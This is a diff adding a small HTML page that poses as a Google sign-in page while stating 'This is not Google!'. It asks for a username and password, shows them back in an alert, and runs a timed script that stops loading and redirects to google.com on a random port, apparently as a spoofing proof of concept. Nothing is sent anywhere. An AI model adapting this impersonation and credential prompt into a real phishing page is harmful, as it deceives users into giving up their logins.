@@ -1,0 +1,25 @@
+<!doctype html>
+<meta charset="utf-8">
+<title>Google Accounts: Sign in</title>
+<style>body{font:16px system-ui;margin:2rem} .fake{border:1px solid #ddd;padding:1rem;border-radius:8px}</style>
+<div class="fake">
+<h1>This is not Google!</h1>
+<button onclick="
+  let username = prompt('Enter your username');
+  let password = prompt('Enter your password');
+  alert('Your creds:\\nUsername: ' + username + '\\nPassword: ' + password);
+">Click me</button>
+</div>
+<script>
+    function spoof() {
+        setTimeout(() => {
+            window.stop();
+            let randomPort;
+            do {
+                randomPort = Math.floor(Math.random() * 1000);
+            } while (randomPort === 0 || randomPort === 443);
+            document.location = "https://google.com:" + randomPort + "/";
+        }, 300);
+    }
+    spoof();
+</script>
